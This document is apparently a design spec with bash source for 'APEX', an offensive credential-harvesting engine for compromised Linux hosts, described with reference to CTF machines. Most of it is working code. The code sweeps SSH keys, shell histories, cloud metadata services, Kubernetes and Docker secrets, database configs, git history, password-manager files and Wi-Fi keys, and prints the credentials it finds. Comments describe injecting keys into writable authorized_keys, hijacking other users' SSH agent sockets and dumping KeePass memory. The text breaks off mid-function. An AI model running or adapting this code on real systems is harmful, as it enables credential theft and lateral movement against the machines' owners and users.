# APEX — Complete Credential and Secret Detection Engine
## Every Hot File, Every Pattern, Every Attack Path From Found Credentials

---

## CURRENT STATE vs WHAT WE NEED

Current design (07_DETECTION_ENGINES.md) has:
```
✓ bash/zsh history files
✓ /proc/*/environ filtered for PASS|PWD|SECRET|KEY|TOKEN
✓ find *.conf *.env files
✓ id_rsa, id_ed25519 SSH private keys
✓ *.bak *.old backup files
✓ /etc/passwd /etc/shadow readable check
✓ *.db *.sqlite database files
✓ ~/.my.cnf mysql credentials
✓ wp-config.php, database.yml, settings.py
✓ /var/log/auth.log credentials in logs
```

MISSING (found by comparing LinPEAS INT_HIDDEN_FILES + real CTF experience):
```
✗ .ssh/ directory deep analysis (authorized_keys, known_hosts, config, agent)
✗ SSH agent socket hijacking
✗ Git repository credential mining (git log, stash, reflog, .git/config)
✗ Cloud credentials (AWS, GCP, Azure, Terraform state)
✗ Container credentials (Docker, Kubernetes)
✗ Password manager files (KeePass .kdbx, pass store, vault)
✗ API token variables (300+ env var name patterns)
✗ History file CONTENT analysis (commands typed with passwords inline)
✗ Process memory credential dumping (gnome-keyring, sshd, vsftpd)
✗ Network credential files (.netrc, .pgpass, .curlrc, .wgetrc)
✗ Writable authorized_keys → SSH key injection → lateral movement
✗ SSL/TLS private keys, VPN configs with embedded creds
✗ Application-specific credential files (Jenkins, Ansible, Vault)
✗ /etc/NetworkManager system connections
```

---

## ENGINE 3 LAYER: COMPLETE CREDENTIAL HUNT

### Full Function Implementation

```bash
run_credential_hunt() {
    local found_creds=0
    
    log_layer "CREDENTIAL HUNT — Layer 3"
    
    # Run all sub-scans in parallel
    scan_ssh_artifacts       > "${APEX_TMP}/creds_ssh.txt"    &
    scan_history_files       > "${APEX_TMP}/creds_history.txt" &
    scan_process_environ     > "${APEX_TMP}/creds_proc.txt"    &
    scan_config_files        > "${APEX_TMP}/creds_config.txt"  &
    scan_cloud_credentials   > "${APEX_TMP}/creds_cloud.txt"   &
    scan_container_creds     > "${APEX_TMP}/creds_container.txt" &
    scan_database_creds      > "${APEX_TMP}/creds_db.txt"      &
    scan_git_repos           > "${APEX_TMP}/creds_git.txt"     &
    scan_password_managers   > "${APEX_TMP}/creds_pwmgr.txt"   &
    scan_network_creds       > "${APEX_TMP}/creds_net.txt"     &
    scan_app_specific_creds  > "${APEX_TMP}/creds_app.txt"     &
    scan_ssl_private_keys    > "${APEX_TMP}/creds_ssl.txt"     &
    wait
    
    # Collect all found credentials and run Credential DNA on each
    cat "${APEX_TMP}"/creds_*.txt | grep "^CRED:" | while IFS=: read _ type user pass path; do
        register_finding "CREDENTIAL" "$path" "type=$type user=$user" 75 "cred_hunt"
        propagate_credential "$user" "$pass" "$type" "$path"
    done
}
```

---

## SECTION 1: SSH ARTIFACTS (Highest Value)

### Why SSH Is The Most Valuable Target

```
SSH private key       → direct login as user on this and other machines
authorized_keys       → if WRITABLE: add our key → login as that user
SSH agent socket      → if accessible: use agent → login AS that user WITH their keys
known_hosts           → reveals what machines this user connects to (pivot map)
SSH config            → may reveal hosts, users, identity files, ProxyJump chains
SSH host keys         → if readable: impersonate this server to clients
```

### Implementation

```bash
scan_ssh_artifacts() {
    
    # ── SSH directories to check (current user + all home dirs) ──────────────
    local ssh_dirs=""
    # Current user's .ssh
    [ -d "$HOME/.ssh" ] && ssh_dirs="$HOME/.ssh"
    # All home directories
    while IFS=: read user _ uid _ _ home _; do
        [ "$uid" -ge 1000 ] || [ "$uid" -eq 0 ] && \
        [ -d "${home}/.ssh" ] && ssh_dirs="$ssh_dirs ${home}/.ssh"
    done < /etc/passwd
    # Root
    [ -d "/root/.ssh" ] && ssh_dirs="$ssh_dirs /root/.ssh"
    
    for sshdir in $ssh_dirs; do
        local owner
        owner=$(stat -c "%U" "$sshdir" 2>/dev/null || ls -la "$sshdir" | awk '{print $3}' | head -1)
        
        # ── Private keys ────────────────────────────────────────────────────
        for keyfile in "$sshdir"/id_rsa "$sshdir"/id_ed25519 "$sshdir"/id_ecdsa \
                        "$sshdir"/id_dsa "$sshdir"/id_xmss; do
            [ -r "$keyfile" ] || continue
            
            # Check if encrypted (has passphrase)
            if grep -q "ENCRYPTED" "$keyfile" 2>/dev/null; then
                echo "CRED:SSH_KEY_ENCRYPTED:$owner:ENCRYPTED:$keyfile"
                # Still valuable — can crack with hashcat/john
            else
                echo "CRED:SSH_KEY_CLEAR:$owner:NO_PASSPHRASE:$keyfile"
                # CRITICAL: ready to use immediately
                # Extract public key fingerprint for correlation
                local fingerprint
                fingerprint=$(ssh-keygen -l -f "$keyfile" 2>/dev/null | awk '{print $2}')
                echo "CRED:SSH_FINGERPRINT:$owner:$fingerprint:$keyfile"
            fi
        done
        
        # ── Any file matching key patterns ──────────────────────────────────
        find "$sshdir" -type f 2>/dev/null | while read f; do
            [ -r "$f" ] && grep -q "BEGIN.*PRIVATE KEY" "$f" 2>/dev/null && {
                echo "CRED:SSH_KEY_ANY:$owner:found:$f"
            }
        done
        
        # ── authorized_keys — WRITABLE = inject our key ──────────────────────
        local authkeys="$sshdir/authorized_keys"
        if [ -f "$authkeys" ]; then
            if [ -w "$authkeys" ]; then
                echo "CRED:AUTHORIZED_KEYS_WRITABLE:$owner:WRITABLE:$authkeys"
                # EXPLOIT: echo 'our_pubkey' >> $authkeys → login as $owner
                # High value if owner is root or has root access
            fi
            # Also: read it — keys here reveal what machines connect
            cat "$authkeys" 2>/dev/null | grep -v '^#' | while read keyline; do
                echo "CRED:AUTHORIZED_KEY_ENTRY:$owner:${keyline##* }:$authkeys"
            done
        fi
        
        # ── authorized_keys DIRECTORY writable (can create the file) ─────────
        if [ ! -f "$authkeys" ] && [ -w "$sshdir" ]; then
            echo "CRED:AUTHORIZED_KEYS_DIR_WRITABLE:$owner:CAN_CREATE:$authkeys"
        fi
        
        # ── known_hosts — pivot map ──────────────────────────────────────────
        local known="$sshdir/known_hosts"
        if [ -r "$known" ]; then
            # Extract hostnames/IPs (may be hashed on modern systems)
            cat "$known" 2>/dev/null | grep -v "^#" | awk '{print $1}' | \
                grep -v '|' | while read host; do
                    echo "CRED:KNOWN_HOST:$owner:$host:$known"
                done
        fi
        
        # ── SSH config — may have passwords or ProxyJump credentials ─────────
        local sshconf="$sshdir/config"
        if [ -r "$sshconf" ]; then
            grep -iE "Host |HostName|User |IdentityFile|ProxyJump|ProxyCommand" \
                "$sshconf" 2>/dev/null | while read line; do
                echo "CRED:SSH_CONFIG:$owner:${line}:$sshconf"
            done
            # Check if IdentityFile points to readable key
            grep -i "IdentityFile" "$sshconf" 2>/dev/null | awk '{print $2}' | \
                while read keypath; do
                    # Expand ~ 
                    keypath="${keypath/#\~/$HOME}"
                    [ -r "$keypath" ] && echo "CRED:SSH_IDENTITY_FILE:$owner:$keypath:$sshconf"
                done
        fi
    done
    
    # ── SSH Agent Socket Hijacking ────────────────────────────────────────────
    # If we find another user's SSH agent socket and can access it → use their keys
    find /tmp /run/user -name "agent.*" -type s 2>/dev/null | while read sock; do
        local sock_owner
        sock_owner=$(stat -c "%U" "$sock" 2>/dev/null)
        # Can we read/write this socket?
        if [ -r "$sock" ] && [ -w "$sock" ]; then
            echo "CRED:SSH_AGENT_HIJACK:$sock_owner:ACCESSIBLE:$sock"
            # EXPLOIT: SSH_AUTH_SOCK=$sock ssh-add -l → lists loaded keys
            #          SSH_AUTH_SOCK=$sock ssh user@host → uses their agent
        fi
    done
    
    # ── SSH host private keys ─────────────────────────────────────────────────
    # If readable: can impersonate this server (MITM, convince clients to connect)
    for hostkey in /etc/ssh/ssh_host_*_key; do
        [ -r "$hostkey" ] && echo "CRED:SSH_HOST_KEY_READABLE:root:IMPERSONATION:$hostkey"
    done
    
    # ── find all readable private keys system-wide ───────────────────────────
    safe_run 30 find / \
        -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" \
        -not -path "/run/*" \
        \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \
           -o -name "id_dsa" -o -name "*.pem" -o -name "*.key" \) \
        -readable -type f 2>/dev/null | while read f; do
        grep -q "PRIVATE KEY" "$f" 2>/dev/null && echo "CRED:PRIVATE_KEY_FOUND:unknown:found:$f"
    done
}
```

---

## SECTION 2: HISTORY FILE CONTENT ANALYSIS

### The Difference: Files vs Content

```
Current design: cat ~/.bash_history → show contents
Missing: GREP history for commands typed WITH passwords inline

Real examples from CTF machines:
  mysql -u root -pSuperSecretPassword123    ← password in command
  curl -u admin:password123 http://api/     ← HTTP basic auth
  sshpass -p 'MyP@ss' ssh user@host        ← SSH with password
  openssl passwd -1 -salt abc MyPassword    ← password visible
  python3 -c "import hashlib; print(hashlib.md5(b'Password1').hexdigest())"
  ansible-playbook -e "db_pass=secret" playbook.yml
  mysqldump -u root -pROOTPASS database     ← root password
  su - root    (followed by checking if there are leftover credentials)
```

### Implementation

```bash
scan_history_files() {
    
    # All history file locations
    local HISTORY_FILES="
        $HOME/.bash_history
        $HOME/.zsh_history
        $HOME/.sh_history
        $HOME/.ash_history
        $HOME/.fish_history
        $HOME/.history
        $HOME/.mysql_history
        $HOME/.psql_history
        $HOME/.python_history
        $HOME/.irb_history
        $HOME/.node_repl_history
        $HOME/.sqlite_history
        /root/.bash_history
        /root/.zsh_history
    "
    
    # Also look in all home dirs
    while IFS=: read user _ uid _ _ home _; do
        [ "$uid" -ge 1000 ] && HISTORY_FILES="$HISTORY_FILES ${home}/.bash_history"
    done < /etc/passwd
    
    # LinPEAS pattern for credential-containing commands
    local CRED_PATTERN="az login|enable_autologin|useradd|mkpasswd|htpasswd|openssl passwd|PASSW|passw|shadow|^su |pkexec|^ftp |mongo|psql -|mysql.*-p|rdesktop|xfreerdp|^ssh.*-p|steghide|KEY=|TOKEN=|BEARER=|Authorization:|chpasswd|sshpass|curl.*-u|wget.*--password|ansible.*-e.*pass|mysqldump.*-p"
    
    for histfile in $HISTORY_FILES; do
        [ -r "$histfile" ] || continue
        [ -s "$histfile" ] || continue
        
        # Search for credential patterns
        grep -nE "$CRED_PATTERN" "$histfile" 2>/dev/null | while read match; do
            local lineno cmd
            lineno=$(echo "$match" | cut -d: -f1)
            cmd=$(echo "$match" | cut -d: -f2-)
            
            # Try to extract actual credential
            extract_cred_from_command "$cmd" "$histfile"
        done
        
        # Specifically find mysql -pPASSWORD pattern
        grep -oE "mysql[^ ]* -p[^ ]+" "$histfile" 2>/dev/null | \
            grep -oE "\-p[^ ]+" | while read p; do
                local pass="${p#-p}"
                [ -n "$pass" ] && echo "CRED:MYSQL_PASS:root:$pass:$histfile"
            done
        
        # sshpass -p 'password' or sshpass -p password
        grep -oE "sshpass -p ['\"]?[^'\" ]+" "$histfile" 2>/dev/null | \
            sed "s/sshpass -p ['\"]*//" | while read pass; do
                [ -n "$pass" ] && echo "CRED:SSHPASS:unknown:$pass:$histfile"
            done
        
        # curl -u user:pass
        grep -oE "curl.*-u [^: ]+:[^ ]+" "$histfile" 2>/dev/null | \
            grep -oE "\-u [^: ]+:[^ ]+" | while read u; do
                echo "CRED:HTTP_BASIC:${u#-u }:found:$histfile"
            done
    done
}

extract_cred_from_command() {
    local cmd="$1"
    local source="$2"
    
    # Pattern: -p password or --password=X or PASSWORD=X
    local pass
    pass=$(echo "$cmd" | grep -oE "(--password[= ][^ ]+|-p[A-Za-z0-9!@#$%^&*]+|PASSWORD=[^ ]+|PASS=[^ ]+)" | head -1)
    [ -n "$pass" ] && echo "CRED:INLINE_PASSWORD:unknown:$pass:$source"
}
```

---

## SECTION 3: CLOUD CREDENTIALS (Critical — Often Overlooked)

### Why Cloud Credentials = Root + Beyond

```
AWS IAM role credentials  → can control entire AWS account
GCP service account key   → cloud admin access
Azure managed identity    → cloud subscription control
Terraform state           → contains ALL provisioned resource credentials
.kube/config             → Kubernetes cluster admin
Docker registry auth      → can pull/modify images, inject backdoors
```

### Implementation

```bash
scan_cloud_credentials() {
    
    # ── AWS ──────────────────────────────────────────────────────────────────
    local aws_cred_files="
        $HOME/.aws/credentials
        $HOME/.aws/config
        /root/.aws/credentials
        /etc/aws_credentials
        /var/app/.aws/credentials
    "
    for f in $aws_cred_files; do
        [ -r "$f" ] || continue
        grep -E "aws_access_key_id|aws_secret_access_key|aws_session_token" "$f" \
            2>/dev/null | while read line; do
            echo "CRED:AWS:unknown:$line:$f"
        done
    done
    
    # AWS keys in environment
    env 2>/dev/null | grep -E "^AWS_ACCESS_KEY|^AWS_SECRET|^AWS_SESSION" | while read v; do
        echo "CRED:AWS_ENV:unknown:$v:environment"
    done
    
    # AWS keys in common places
    find / -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" \
        -name "credentials" -readable 2>/dev/null | xargs grep -l "aws_access_key_id" 2>/dev/null | \
        while read f; do echo "CRED:AWS_CRED_FILE:unknown:found:$f"; done
    
    # AWS IMDS — if in AWS: get instance credentials
    local imds_token
    imds_token=$(safe_run 3 curl -s -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
    if [ -n "$imds_token" ]; then
        local role
        role=$(safe_run 3 curl -s -H "X-aws-ec2-metadata-token: $imds_token" \
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null)
        [ -n "$role" ] && echo "CRED:AWS_IMDS_ROLE:aws:$role:http://169.254.169.254"
    fi
    
    # ── GCP ──────────────────────────────────────────────────────────────────
    find / -not -path "/proc/*" -not -path "/sys/*" \
        -name "*.json" -readable 2>/dev/null | xargs grep -l '"type": "service_account"' \
        2>/dev/null | while read f; do
            echo "CRED:GCP_SERVICE_ACCOUNT:unknown:found:$f"
        done
    
    # GCP IMDS
    local gcp_check
    gcp_check=$(safe_run 3 curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
        2>/dev/null)
    [ -n "$gcp_check" ] && echo "CRED:GCP_IMDS:gcp:$gcp_check:http://metadata.google.internal"
    
    # ── Azure ─────────────────────────────────────────────────────────────────
    [ -r "$HOME/.azure/azureProfile.json" ] && \
        echo "CRED:AZURE_PROFILE:unknown:found:$HOME/.azure/azureProfile.json"
    [ -r "$HOME/.azure/msal_token_cache.bin" ] && \
        echo "CRED:AZURE_TOKEN:unknown:found:$HOME/.azure/msal_token_cache.bin"
    
    # Azure IMDS
    local az_check
    az_check=$(safe_run 3 curl -s -H "Metadata:true" \
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | \
        grep -c "subscriptionId")
    [ "${az_check:-0}" -gt 0 ] && \
        echo "CRED:AZURE_IMDS:azure:found:http://169.254.169.254/metadata"
    
    # ── Terraform ─────────────────────────────────────────────────────────────
    # .tfstate contains ALL credentials used to provision infrastructure
    find / -not -path "/proc/*" -not -path "/sys/*" \
        -name "*.tfstate" -readable 2>/dev/null | while read f; do
        echo "CRED:TERRAFORM_STATE:unknown:found:$f"
        # Extract credentials from state
        grep -oE '"password"[[:space:]]*:[[:space:]]*"[^"]+"' "$f" 2>/dev/null | head -5 | \
            while read cred; do echo "CRED:TERRAFORM_CRED:unknown:$cred:$f"; done
    done
    
    find / -not -path "/proc/*" -not -path "/sys/*" \
        -name "*.tfvars" -readable 2>/dev/null | while read f; do
        grep -iE "password|secret|key|token" "$f" 2>/dev/null | while read line; do
            echo "CRED:TFVARS:unknown:$line:$f"
        done
    done
    
    # ── Vault ─────────────────────────────────────────────────────────────────
    [ -r "$HOME/.vault-token" ] && {
        local vault_token
        vault_token=$(cat "$HOME/.vault-token" 2>/dev/null)
        echo "CRED:VAULT_TOKEN:unknown:$vault_token:$HOME/.vault-token"
    }
}
```

---

## SECTION 4: CONTAINER CREDENTIALS

```bash
scan_container_creds() {
    
    # ── Docker ────────────────────────────────────────────────────────────────
    local docker_config="$HOME/.docker/config.json"
    [ -r "$docker_config" ] && {
        grep -E '"auth"|"username"|"password"' "$docker_config" 2>/dev/null | \
            while read line; do echo "CRED:DOCKER_REGISTRY:unknown:$line:$docker_config"; done
        # base64 decode the auth field
        grep -o '"auth":"[^"]*"' "$docker_config" 2>/dev/null | \
            cut -d'"' -f4 | base64 -d 2>/dev/null | \
            while read decoded; do echo "CRED:DOCKER_AUTH_DECODED:unknown:$decoded:$docker_config"; done
    }
    
    # ── Kubernetes ────────────────────────────────────────────────────────────
    local kubeconfig="$HOME/.kube/config"
    [ -r "$kubeconfig" ] && {
        echo "CRED:KUBECONFIG:unknown:found:$kubeconfig"
        # Extract tokens and certs
        grep -E "token:|password:" "$kubeconfig" 2>/dev/null | while read line; do
            echo "CRED:KUBE_SECRET:unknown:$line:$kubeconfig"
        done
    }
    
    # ServiceAccount token (in-cluster)
    local sa_token="/var/run/secrets/kubernetes.io/serviceaccount/token"
    [ -r "$sa_token" ] && echo "CRED:K8S_SA_TOKEN:serviceaccount:found:$sa_token"
    
    # ── Container environment variables ──────────────────────────────────────
    # Check if we're in a container with leaked credentials in env
    env 2>/dev/null | grep -iE "PASSWORD|SECRET|TOKEN|KEY|CRED|API_KEY|DATABASE_URL" | \
        grep -v "^TERM=\|^SHELL=\|^PATH=\|^SHLVL=" | while read v; do
            echo "CRED:CONTAINER_ENV:unknown:$v:environment"
        done
}
```

---

## SECTION 5: DATABASE CREDENTIALS

```bash
scan_database_creds() {
    
    # ── MySQL ─────────────────────────────────────────────────────────────────
    for mycnf in ~/.my.cnf /root/.my.cnf /etc/mysql/my.cnf \
                  /etc/mysql/debian.cnf /var/lib/mysql/.my.cnf; do
        [ -r "$mycnf" ] || continue
        grep -E "^password|^user" "$mycnf" 2>/dev/null | while read line; do
            echo "CRED:MYSQL_CNF:mysql:$line:$mycnf"
        done
    done
    
    # MySQL debian.cnf often has root password
    [ -r /etc/mysql/debian.cnf ] && \
        grep -A2 "\[client\]" /etc/mysql/debian.cnf 2>/dev/null | \
        grep "password" | while read p; do
            echo "CRED:MYSQL_DEBIAN:root:$p:/etc/mysql/debian.cnf"
        done
    
    # ── PostgreSQL ────────────────────────────────────────────────────────────
    for pgpass in ~/.pgpass /root/.pgpass; do
        [ -r "$pgpass" ] && \
            cat "$pgpass" 2>/dev/null | grep -v '^#' | while read line; do
                echo "CRED:PGPASS:postgres:$line:$pgpass"
            done
    done
    
    # pg_hba.conf — may show md5/trust authentication
    [ -r /etc/postgresql/*/main/pg_hba.conf ] && \
        grep "trust\|md5" /etc/postgresql/*/main/pg_hba.conf 2>/dev/null | \
        grep -v "^#" | while read line; do
            echo "CRED:PG_HBA_TRUST:postgres:$line:/etc/postgresql/pg_hba.conf"
        done
    
    # ── MongoDB ───────────────────────────────────────────────────────────────
    # Check if MongoDB is running without auth (common misconfiguration)
    if safe_run 3 mongo --quiet --eval "db.adminCommand('listDatabases')" \
            --host 127.0.0.1 >/dev/null 2>/dev/null; then
        echo "CRED:MONGODB_NO_AUTH:root:NO_AUTH:127.0.0.1:27017"
    fi
    
    # ── Redis ─────────────────────────────────────────────────────────────────
    if safe_run 3 redis-cli -h 127.0.0.1 ping 2>/dev/null | grep -q "PONG"; then
        echo "CRED:REDIS_NO_AUTH:root:NO_AUTH:127.0.0.1:6379"
        # Redis CONFIG SET dir = file write as redis user
        # May be running as root!
    fi
    
    # ── SQLite databases ──────────────────────────────────────────────────────
    find / -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" \
        \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \) \
        -readable 2>/dev/null | while read db; do
        echo "CRED:SQLITE_DB:unknown:found:$db"
        # Try to extract password/hash columns
        safe_run 5 sqlite3 "$db" \
            "SELECT name FROM sqlite_master WHERE type='table';" 2>/dev/null | \
            while read table; do
                safe_run 5 sqlite3 "$db" \
                    "SELECT * FROM $table LIMIT 3;" 2>/dev/null | \
                    grep -iE "password|hash|passwd|secret|token" | head -3 | while read row; do
                        echo "CRED:SQLITE_ROW:$table:$row:$db"
                    done
            done
    done
}
```

---

## SECTION 6: GIT REPOSITORY MINING

### Why Git Is Goldmine

```
Developers accidentally commit credentials.
They then remove the credentials in next commit.
But git history KEEPS the old commit forever.
git log --all --full-history shows every commit including deleted content.
git stash may contain uncommitted work with credentials.
.git/config may have credentials in remote URL:
  https://user:password@github.com/org/repo.git
```

```bash
scan_git_repos() {
    
    # Find all git repositories accessible to us
    find / -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" \
        -name ".git" -type d -readable 2>/dev/null | while read gitdir; do
        local repo="${gitdir%/.git}"
        
        echo "GIT_REPO: $repo"
        
        # Check remote URLs for embedded credentials
        safe_run 5 git -C "$repo" remote -v 2>/dev/null | \
            grep -oE "https://[^:]+:[^@]+@" | while read url; do
                echo "CRED:GIT_REMOTE_URL:unknown:$url:$gitdir/config"
            done
        
        # Search git log for credential patterns
        safe_run 30 git -C "$repo" log --all --full-history \
            --pretty=format:"%H %s" 2>/dev/null | \
            grep -iE "password|secret|credential|api.key|token" | head -5 | \
            while read commit_info; do
                local hash
                hash=$(echo "$commit_info" | awk '{print $1}')
                echo "CRED:GIT_LOG_CRED_COMMIT:unknown:$commit_info:$repo"
                # Show the actual diff of that commit
                safe_run 10 git -C "$repo" show "$hash" 2>/dev/null | \
                    grep -E "^\+" | grep -iE "password|secret|token|key" | head -3 | \
                    while read diff_line; do
                        echo "CRED:GIT_COMMIT_CONTENT:unknown:$diff_line:$repo"
                    done
            done
        
        # Check git stash
        safe_run 10 git -C "$repo" stash list 2>/dev/null | while read stash; do
            safe_run 10 git -C "$repo" stash show -p 2>/dev/null | \
                grep -iE "password|secret|token|key|api" | head -5 | while read line; do
                    echo "CRED:GIT_STASH:unknown:$line:$repo/.git/stash"
                done
        done
        
        # .git/config may have credentials
        [ -r "$gitdir/config" ] && \
            grep -iE "url.*:.*@|password|token" "$gitdir/config" 2>/dev/null | \
            while read line; do
                echo "CRED:GIT_CONFIG:unknown:$line:$gitdir/config"
            done
    done
}
```

---

## SECTION 7: PASSWORD MANAGER FILES

```bash
scan_password_managers() {
    
    # ── KeePass ───────────────────────────────────────────────────────────────
    find / -not -path "/proc/*" -not -path "/sys/*" \
        \( -name "*.kdbx" -o -name "*.kdb" \) -readable 2>/dev/null | while read f; do
        echo "CRED:KEEPASS_DB:unknown:found:$f"
        # Note: .kdbx = KeePass 2.x, requires master password or keyfile
        # HTB Keeper = dump process memory of KeePassXC to extract master
    done
    
    # KeePass running in memory → dump via /proc
    for pid_dir in /proc/[0-9]*/; do
        local pid="${pid_dir%/}"
        pid="${pid##*/}"
        local cmdline
        cmdline=$(cat "$pid_dir/cmdline" 2>/dev/null | tr '\0' ' ')
        echo "$cmdline" | grep -qi "keepass" && {
            echo "CRED:KEEPASS_PROCESS:unknown:PID=$pid:$cmdline"
            # Layer 10 hint: dump process memory from /proc/$pid/mem
        }
    done
    
    # ── pass (Unix password manager) ─────────────────────────────────────────
    [ -d "$HOME/.password-store" ] && {
        find "$HOME/.password-store" -name "*.gpg" 2>/dev/null | while read f; do
            echo "CRED:PASS_STORE_ENTRY:unknown:found:$f"
        done
        echo "CRED:PASS_STORE_DIR:unknown:found:$HOME/.password-store"
    }
    
    # ── gopass ────────────────────────────────────────────────────────────────
    [ -d "$HOME/.local/share/gopass" ] && \
        echo "CRED:GOPASS_STORE:unknown:found:$HOME/.local/share/gopass"
    
    # ── 1Password, Bitwarden CLI ──────────────────────────────────────────────
    [ -f "$HOME/.config/op/config" ] && \
        echo "CRED:1PASSWORD_CONFIG:unknown:found:$HOME/.config/op/config"
    find / -not -path "/proc/*" -name "bw_session*" -readable 2>/dev/null | while read f; do
        echo "CRED:BITWARDEN_SESSION:unknown:found:$f"
    done
}
```

---

## SECTION 8: NETWORK AND APPLICATION CREDENTIALS

```bash
scan_network_creds() {
    
    # ── .netrc (FTP/HTTP basic auth, old-school) ─────────────────────────────
    for netrc in ~/.netrc /root/.netrc; do
        [ -r "$netrc" ] && \
            cat "$netrc" 2>/dev/null | grep -v "^#" | while read line; do
                echo "CRED:NETRC:unknown:$line:$netrc"
            done
    done
    
    # ── .curlrc (may have -u user:pass or --header Authorization:) ────────────
    [ -r "$HOME/.curlrc" ] && \
        grep -iE "user|header.*auth|netrc" "$HOME/.curlrc" 2>/dev/null | while read line; do
            echo "CRED:CURLRC:unknown:$line:$HOME/.curlrc"
        done
    
    # ── .wgetrc ───────────────────────────────────────────────────────────────
    [ -r "$HOME/.wgetrc" ] && \
        grep -iE "http_user|http_password|ftp_user|ftp_password" "$HOME/.wgetrc" 2>/dev/null | \
        while read line; do
            echo "CRED:WGETRC:unknown:$line:$HOME/.wgetrc"
        done
    
    # ── NetworkManager (WiFi passwords — rare on servers, common on desktops) ─
    find /etc/NetworkManager/system-connections/ -readable -type f 2>/dev/null | \
        while read f; do
            grep -E "^psk=|^password=|^password-flags=" "$f" 2>/dev/null | while read line; do
                echo "CRED:NETWORKMANAGER:unknown:$line:$f"
            done
        done
    
    # ── /etc/fstab (may have SMB credentials) ─────────────────────────────────
    grep -iE "username=|password=|credentials=" /etc/fstab 2>/dev/null | while read line; do
        echo "CRED:FSTAB:unknown:$line:/etc/fstab"
    done
    
    # SMB credentials file referenced in fstab
    grep -oE "credentials=[^ ,]+" /etc/fstab 2>/dev/null | cut -d= -f2 | while read credfile; do
        [ -r "$credfile" ] && cat "$credfile" | while read line; do
            echo "CRED:SMB_CREDFILE:unknown:$line:$credfile"
        done
    done
}

scan_app_specific_creds() {
    
    # ── Web application configs ───────────────────────────────────────────────
    local WEB_CONFIGS="
        wp-config.php
        configuration.php
        config.php
        database.php
        db.php
        settings.py
        settings.php
        database.yml
        database.yaml
        config/database.yml
        .env
        .env.local
        .env.production
        config/secrets.yml
        config/application.yml
        config/config.php
        app/config/parameters.yml
        application.properties
        application.yml
        hibernate.cfg.xml
        persistence.xml
    "
    
    # Find web configs by name
    for config_name in $WEB_CONFIGS; do
        find / -not -path "/proc/*" -not -path "/sys/*" \
            -name "$config_name" -readable 2>/dev/null | while read f; do
            # Check for credential patterns in this specific config
            grep -iE "(password|passwd|pwd|secret|token|key|credential|auth)[[:space:]]*[=:]" \
                "$f" 2>/dev/null | grep -v "^#\|^//" | head -5 | while read line; do
                echo "CRED:WEB_CONFIG:unknown:$line:$f"
            done
        done
    done
    
    # ── Jenkins ───────────────────────────────────────────────────────────────
    find / -not -path "/proc/*" -not -path "/sys/*" \
        -name "credentials.xml" -readable 2>/dev/null | while read f; do
        echo "CRED:JENKINS_CREDS:unknown:found:$f"
        grep -oE "<secret>[^<]+|<password>[^<]+|<apiToken>[^<]+" "$f" 2>/dev/null | \
            while read secret; do echo "CRED:JENKINS_SECRET:unknown:$secret:$f"; done
    done
    
    # ── Ansible ───────────────────────────────────────────────────────────────
    find / -not -path "/proc/*" -not -path "/sys/*" \
        -name "*.vault" -o -name "vault.yml" -readable 2>/dev/null | while read f; do
        echo "CRED:ANSIBLE_VAULT:unknown:found:$f"
    done
    
    # Ansible inventory with credentials
    find / -not -path "/proc/*" -not -path "/sys/*" \
        -name "hosts" -o -name "inventory" -readable 2>/dev/null | while read f; do
        grep -iE "ansible_ssh_pass|ansible_become_pass|ansible_password" "$f" 2>/dev/null | \
            while read line; do echo "CRED:ANSIBLE_INVENTORY:unknown:$line:$f"; done
    done
    
    # ── Ruby on Rails ─────────────────────────────────────────────────────────
    find / -not -path "/proc/*" -not -path "/sys/*" \
        -name "secrets.yml" -o -name "master.key" -readable 2>/dev/null | while read f; do
        echo "CRED:RAILS_SECRET:unknown:found:$f"
    done
    
    # ── PHP configuration files ────────────────────────────────────────────────
    find /var/www /srv /opt -name "*.php" -readable 2>/dev/null | \
        xargs grep -l "password\|passwd\|db_pass" 2>/dev/null | head -20 | while read f; do
        grep -E "(\\\$[a-zA-Z]*[Pp]ass[a-zA-Z]*|DB_PASS|DATABASE_PASSWORD)[[:space:]]*=[[:space:]]*['\"]" \
            "$f" 2>/dev/null | grep -v "^#" | head -3 | while read line; do
            echo "CRED:PHP_CONFIG:unknown:$line:$f"
        done
    done
}

scan_ssl_private_keys() {
    
    # Find all SSL/TLS private keys (PEM format)
    find / -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" \
        \( -name "*.pem" -o -name "*.key" -o -name "*.p12" \
           -o -name "*.pfx" -o -name "*.jks" -o -name "*.ovpn" \) \
        -readable 2>/dev/null | while read f; do
        
        # Check if it's actually a private key
        if grep -q "BEGIN.*PRIVATE KEY\|BEGIN RSA PRIVATE KEY\|BEGIN EC PRIVATE KEY" "$f" 2>/dev/null; then
            echo "CRED:SSL_PRIVATE_KEY:unknown:found:$f"
        fi
        
        # VPN configs with embedded credentials
        if echo "$f" | grep -q "\.ovpn$"; then
            echo "CRED:VPN_CONFIG:unknown:found:$f"
            grep -iE "^auth-user-pass|username|password" "$f" 2>/dev/null | while read line; do
                echo "CRED:VPN_CRED:unknown:$line:$f"
            done
        fi
        
        # Java keystore
        if echo "$f" | grep -qE "\.(jks|p12|pfx)$"; then
            echo "CRED:JAVA_KEYSTORE:unknown:found:$f"
        fi
    done
}
```

---

## SECTION 9: PROCESS ENVIRONMENT AND MEMORY

```bash
scan_process_environ() {
    
    # /proc/*/environ — most tools do this but APEX filters better
    # Pattern = LinPEAS's comprehensive variable name list
    
    local CRED_VARS="PASSWORD|PASSWD|SECRET|TOKEN|API_KEY|AUTH|CREDENTIAL|DB_PASS|DATABASE_URL|PRIVATE_KEY|ACCESS_KEY|AWS_|GCP_|AZURE_|GITHUB_TOKEN|GITLAB_TOKEN|SLACK_TOKEN|STRIPE_|PAYPAL_|SENDGRID_|MAILGUN_|TWILIO_|HEROKU_API"
    
    for pid in /proc/[0-9]*/; do
        [ -r "${pid}environ" ] || continue
        
        local uid
        uid=$(grep "^Uid:" "${pid}status" 2>/dev/null | awk '{print $2}')
        
        # Check root process environments — high value
